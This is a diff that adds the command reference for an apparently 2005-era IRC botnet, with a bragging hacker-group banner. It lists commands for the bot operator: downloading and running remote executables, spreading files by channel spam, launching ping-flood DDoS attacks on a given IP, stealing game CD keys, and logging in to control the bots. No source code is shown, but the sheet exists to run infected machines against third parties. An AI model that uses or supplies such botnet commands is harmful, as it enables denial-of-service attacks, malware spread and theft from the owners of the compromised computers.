@@ -1,0 +1,39 @@
+***********************************************
+*   _____        _________  .___  ___________ *
+*  /     \      /   _____/  |   | \__    ___/ *
+* /  \ /  \     \_____  \   |   |   |    |    *
+*/    Y    \    /        \  |   |   |    |    *
+*\____|__  / /\/_______  / /\___| /\|____|/\  *
+*        \/  \/        \/  \/     \/      \/  *
+*                                             *
+*   -= LETS OWN THAT MOTHER FUCKING WORLD =-  *
+*                2005 M.S.I.T.                *
+*                  by: t3ch                   *
+***********************************************
+
+
+1.)  !upgrade     http://127.0.0.1:80/File.exe SaveFile.exe
+
+2.)  !install_HTTP http://127.0.0.1:80/File.exe SaveFile.exe 4000
+     !closeHTTP
+
+3.)  !startSP 2000 filename.exe 5 0||1   // 0 not spm op , 1 spm op
+              delay  spm-file  loops
+
+     !addSPText download this:
+	 !addSPChan #chan
+	 !delSPChan 2
+	 !showSPChan
+
+4.)  !uninstall devil
+
+5.)  !ddos-ping 127.0.0.1 10000   500   50
+                  ip       byte  delay  loop
+6.)  !getcdkey
+
+7.)  !join #channel
+     !part #channel
+
+8.)  !restart
+
+9.)  !login password
